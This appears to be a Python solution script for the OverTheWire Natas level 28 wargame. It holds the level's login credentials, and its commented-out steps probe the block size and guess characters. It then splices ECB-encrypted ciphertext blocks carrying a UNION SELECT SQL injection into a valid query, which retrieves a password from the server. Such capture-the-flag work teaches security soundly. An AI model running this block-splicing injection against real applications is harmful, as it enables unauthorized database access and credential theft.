import base64
import string
import requests
import re

username = 'natas28'
password = 'Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.session()

# for i in range(30):
#     response = requests.post(url, auth = (username, password), data= {"query":"a"*i})
#     print("Testing to query length: ", i," ",requests.utils.unquote(response.url))
	# print("Response URL length: ",len(base64.b64decode(requests.utils.unquote(response.url))))
    
block_size = 16    

# for c in string.printable:
#     response = requests.post(url, auth = (username, password), data= {"query":f"{c}"})
#     print(f"URL for character {c}: ", response.url)

# correct_string = '\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb'

# for c in string.printable:
# 	print ("trying", c)
# 	response = requests.post(url, auth = (username, password),
# 						data = {"query":"a"*8 + '%' + c})
# 	block = 2
# 	answer = base64.b64decode(requests.utils.unquote(response.url[60:]))[block*block_size:(block+1)*block_size]
# 	if answer == correct_string:
# 		print ("WE FOUND THE CHARACTER", c)
	
injection = 'a'*9 + "' UNION SELECT password FROM users; #"

blocks = ( len(injection) - 10 ) // block_size
if ( len(injection) - 10 ) % block_size != 0: blocks += 1

response = session.post(url, auth = (username, password),
						data = {"query":injection})

raw_inject = base64.b64decode(requests.utils.unquote(response.url[60:]))

response = session.post(url, auth = (username, password),
						data = {"query":'a'*10})

good_base = base64.b64decode(requests.utils.unquote(response.url[60:]))

query = good_base[:block_size*3] + raw_inject[block_size*3:block_size*3+(blocks*block_size)] + good_base[block_size*3:]
query =  requests.utils.quote(base64.b64encode(query)).replace('/','%2F')

response = session.get(url + '/search.php/?query='+query, auth = (username, password))
print (re.findall(r'<li>(.*)</li>',response.text)[0])

#print (response.url)
# print (re.findall("[password] =&gt; (.*)\n",response.text)[0])

# 
